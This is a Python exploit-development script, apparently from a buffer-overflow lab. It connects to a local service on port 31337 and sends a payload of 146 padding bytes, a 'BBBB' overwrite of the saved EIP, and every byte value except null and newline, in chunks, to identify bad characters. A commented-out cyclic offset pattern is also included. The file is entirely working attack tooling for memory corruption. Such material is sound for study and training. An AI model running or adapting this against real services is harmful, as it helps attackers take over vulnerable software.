#!/usr/bin/env python3
#2025-01-17

import socket, time, sys, math

ip = "localhost"
port = 31337

eip_pos = 146
after_eip = eip_pos * b"A" + b"BBBB"

allchars = "".join([chr(i) for i in range(256)])  # Generate all characters from \x00 to \xff
badchars = "\x00\x0a"
usechars = "".join(c for c in allchars if c not in badchars) # Remove badchars from allchars

usechars = bytes(usechars, "latin-1")
#print(allchars)

#test data
#usechars = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As"

max_length = 300
length = len(usechars)
print("Usechars length: "+str(length)+" steps "+str(math.ceil(length/max_length)))

try:

  if length > max_length:
    steps = math.ceil(length/max_length)

    for i in range(steps): #we want this repeated length/maxlength rounded up
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, port))

        print("Sending badchars section "+str(i))
        if not i == steps-1:
          string = usechars[i*max_length:(i+1)*max_length]
        else:
          string = usechars[length-max_length:]
        s.send(after_eip+string+b'\n') #add \r\n if can't recv data
        print("Sent: "+str(string)+" len:"+str(len(string)))

        if not i == steps-1:
          input("Press Enter after restarting the program...")
        
  else:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.connect((ip, port))
      print("Sending badchars.")
      string = usechars
      s.send(after_eip+string+b'\n') #add \r\n if can't recv data
      print("Sent: "+str(string))
    
except Exception as e:
  print("Exception: "+str(e))
  sys.exit(0)
